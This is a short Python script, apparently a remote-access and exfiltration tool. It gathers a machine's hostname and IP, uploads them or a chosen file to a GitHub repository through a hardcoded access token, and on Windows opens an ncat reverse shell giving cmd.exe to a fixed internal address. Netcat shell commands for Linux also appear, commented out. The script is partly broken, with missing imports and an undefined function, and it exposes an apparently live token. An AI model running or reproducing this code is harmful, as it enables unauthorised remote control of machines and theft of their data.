import platform
import os
import sysconfig
import socket
import json




def subir_archivo( nombre_archivo, contenido_archivo):
    url = f"https://api.github.com/repos/kaki714/Not/contents/data/{nombre_archivo}"
    token= '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'
    headers = {
        "Authorization": f"token {token}",
        "Content-Type": "application/json"
    }
    contenido_base64 = b64encode(contenido_archivo.encode()).decode()
    data = {
        "message": "Agregar archivo",
        "content": contenido_base64
    }
    response = requests.post(url, json=data, headers=headers)
    if response.status_code == 201:
        print("Archivo subido exitosamente")
    else:
        print(f"Error al subir el archivo: {response.json()['message']}")


def run():
    hostname=socket.gethostname()   
    IPAddr=socket.gethostbyname(hostname) 
    iph='172.16.22.74'
    print('')
    print(' ############### # # # ##############')
    print(' ####### ###### # #  # # ####### ####')
    print(' ######   ##### ##    ## ######   ###')
    print(' ####### #######  #  #  ######## ####')
    print(' ################ ### ###############')
    print('')
    print('# OS name: ', platform.system())
    if "Linux" in platform.system():
        print('Linux: ', sysconfig.get_platform(),' === CONNECTED ') 
        print(' IpAddress: ', IPAddr)
        print('insert Filename to upload: ')
        archive=input()
        upload_file_to_github(archive)
        #os.system( 'nc -lvp 734 -e /bin/sh')
        #os.system('nc' + iph+ ' 734 -e /bin/sh')
    elif "Windows" in platform.system():
        print('Windows: ', sysconfig.get_platform(),' === CONNECTED ') 
        print('Address ip: ', IPAddr)
        stmnt= 'Info: '+ IPAddr+'    |   '+sysconfig.get_platform()
        subir_archivo('info.txt', stmnt )
        #os.system('ncat -lvp 734 -e cmd.exe')
        os.system('ncat '+ iph +' 734 -e cmd.exe')
    
